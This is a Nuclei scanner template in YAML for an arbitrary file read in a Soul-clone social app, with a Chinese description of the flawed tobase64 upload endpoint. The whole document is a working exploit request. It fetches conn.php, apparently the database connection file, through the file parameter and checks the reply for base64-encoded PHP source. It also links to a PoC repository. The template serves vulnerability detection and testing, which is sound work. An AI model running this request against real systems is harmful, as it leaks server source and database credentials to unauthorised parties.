id: soul-upload-lfi

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 位于 /application/api/controller/upload.php 控制器中的tobase64 方法通过传入file参数 然后通过fopen直接读取任意文件，然后输出base64编码后的文件.
  reference:
    - https://github.com/wy876/POC/blob/2fdfb36b6f8f039319461fd394e980d959ca062e/%E7%A4%BE%E4%BA%A4%E7%B3%BB%E7%BB%9F/%E6%9F%90%E4%BB%BFsoul%E6%AC%B2%E9%9F%B3%E7%A4%BE%E4%BA%A4%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/upload/tobase64?file=conn.php"
    matchers:
      - type: word
        part: body
        words:
          - "PD9w"
#base64